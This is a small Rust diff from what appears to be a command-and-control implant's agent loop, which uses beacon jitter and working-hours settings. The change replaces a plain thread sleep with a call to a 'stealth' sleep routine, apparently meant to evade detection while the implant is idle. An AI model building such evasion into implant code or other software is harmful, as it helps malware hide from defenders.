@@ -255,7 +255,7 @@ impl Agent {
         let jitter = self.shared.jitter;
         let interval = self.shared.sleep_interval;
         let sleep_time = calculate_sleep_time(interval, jitter);
-        std::thread::sleep(std::time::Duration::from_secs(sleep_time));
+        crate::stealth::do_stealth_sleep(sleep_time);
 
         // Respect working hours
         let working_start = NaiveDateTime::new(now.date(), self.shared.working_start);
